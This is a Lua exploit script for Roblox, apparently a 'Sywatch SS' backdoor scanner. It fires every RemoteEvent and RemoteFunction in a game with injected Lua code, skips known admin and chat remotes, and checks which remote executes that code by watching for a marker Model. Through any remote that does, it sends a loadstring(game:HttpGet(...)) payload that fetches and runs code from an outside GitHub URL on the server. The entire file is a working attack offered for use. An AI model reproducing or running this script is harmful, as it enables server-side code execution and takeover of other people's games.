function debug(Text, LVL)
	local func = print
	if LVL == 1 then func = print end
	if LVL == 2 then func = error end
	if LVL == 3 then func = warn end
	func("Sywatch SS: " .. Text)
end
function runRemote(v, data)
	if v:IsA("RemoteEvent") then
		v:FireServer(data)
	elseif v:IsA("RemoteFunction") then
		spawn(function()
			v:InvokeServer(data)
		end)
	end
end
function generateName(length)
	local alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	local text = ""
	for i = 1, length do
		local randomIndex = math.random(1, #alphabet)
		text = text .. alphabet:sub(randomIndex, randomIndex)
	end
	return text
end
function findRemote()
	local remotes = {}
	local protected_backdoor = game:GetService("ReplicatedStorage"):FindFirstChild("Sywatch SS" .. ((game.PlaceId / 7777) * 6009 * game.PlaceId))
	if protected_backdoor and protected_backdoor:IsA("RemoteFunction") then
		repeat
			code = generateName(math.random(12, 30))
		until not remotes[code]
		spawn(function()
			protected_backdoor:InvokeServer("Sywatch SS", "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")
		end)
		remotes[code] = protected_backdoor
	end		
	for _, v in ipairs(game:GetDescendants()) do
		if not (v:IsA("RemoteEvent") or v:IsA("RemoteFunction")) then
			continue
		end
		if string.split(v:GetFullName(), ".")[1] == "RobloxReplicatedStorage" then
			debug("Roblox Replicated Storage (" .. v.Name .. ")", 1)
			continue
		end
		if ((v.Parent == game:GetService("ReplicatedStorage")) or (v.Parent.Parent == game:GetService("ReplicatedStorage")) or (v.Parent.Parent.Parent == game:GetService("ReplicatedStorage"))) then
			if v:FindFirstChild("__FUNCTION") or v.Name == "__FUNCTION" then
				debug("Adonis filter detected (" .. v.Name .. ")", 1)
				continue
			end
			if ((v.Parent.Parent.Name == "HDAdminClient") and (v.Parent.Name == "Signals")) then
				debug("HD Admin (" .. v.Name .. ")", 1)
				continue
			end
			if (v.Parent.Name == "DefaultChatSystemChatEvents") then
				debug("Chat event (" .. v.Name .. ")", 1)
				continue
			end
		end
		repeat
			code = generateName(math.random(12, 30))
		until not remotes[code]
		runRemote(v, "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")
		remotes[code] = v
		debug("Sended Backdoor '" .. v:GetFullName() .. "'", 1)
	end
	for _ = 1, 100 do
		for code, v in pairs(remotes) do
			if game:GetService("Workspace"):FindFirstChild(code) then
				debug(v:GetFullName(), 3)
				runRemote(v, [[loadstring(game:HttpGet("https://raw.githubusercontent.com/SwitchWatcher/Sywatcher-Hub/refs/heads/main/MainModule.cpp"))()]])
				return true
			end
		end
	end
	return false
end
